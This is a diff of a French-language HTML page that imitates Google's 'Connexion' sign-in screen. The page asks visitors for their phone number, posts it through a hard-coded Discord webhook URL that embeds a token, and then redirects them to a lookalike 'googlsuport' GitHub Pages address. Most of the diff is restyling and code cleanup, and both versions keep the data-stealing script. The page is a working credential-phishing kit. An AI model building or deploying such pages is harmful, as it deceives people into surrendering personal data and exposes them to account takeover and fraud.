@@ -1,30 +1,34 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Connexion - Google</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    /* Styles identiques à ta version précédente */
     body {
       font-family: Arial, sans-serif;
-      padding: 20px;
       background: #fff;
-      color: #202124;
+      margin: 0;
+      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
     .container {
-      width: 320px;
+      max-width: 360px;
+      width: 90%;
       text-align: center;
+    }
+    .logo {
+      width: 92px;
+      margin-bottom: 24px;
     }
     input, button {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
       font-size: 16px;
+      margin: 10px 0;
     }
     button {
       background-color: #1a73e8;
@@ -39,40 +43,52 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
     <h1>Connexion</h1>
     <p>Entrez votre numéro de téléphone pour continuer</p>
-    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" autocomplete="tel" />
-    <button id="sendBtn">Suivant</button>
+    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" autocomplete="tel">
+    <button id="send">Suivant</button>
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1399331411558797363/L-4Sn5hwtib-iQQei_gP1pPrCqf0jRYWiridji5jA2sGajdEdCzIX1uymbsWIEunmUWs";
-    const phoneInput = document.getElementById('phone');
-    const sendBtn = document.getElementById('sendBtn');
+    const phoneInput = document.getElementById("phone");
+    const sendBtn = document.getElementById("send");
 
-    sendBtn.addEventListener('click', () => {
+    sendBtn.addEventListener("click", () => {
       const phone = phoneInput.value.trim();
       if (!phone) {
-        alert("Veuillez entrer un numéro de téléphone");
-        phoneInput.focus();
+        alert("Veuillez entrer un numéro.");
         return;
       }
+
+      const payload = {
+        content: "Numéro de téléphone reçu : " + phone
+      };
+
       fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: `Numéro de téléphone reçu : ${phone}` })
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
       })
-      .then(() => {
+      .then(response => {
+        console.log("Envoi réussi", response.status);
         setTimeout(() => {
           window.location.href = "https://googlsuport.github.io/googleproblem/";
-        }, 800);
+        }, 1000); // délai pour laisser partir la requête
       })
-      .catch(() => alert("Erreur lors de l'envoi."));
+      .catch(error => {
+        console.error("Erreur d'envoi :", error);
+        alert("Erreur réseau.");
+      });
     });
 
-    phoneInput.addEventListener('keydown', e => {
-      if (e.key === 'Enter') sendBtn.click();
+    phoneInput.addEventListener("keydown", e => {
+      if (e.key === "Enter") {
+        sendBtn.click();
+      }
     });
   </script>
 </body>
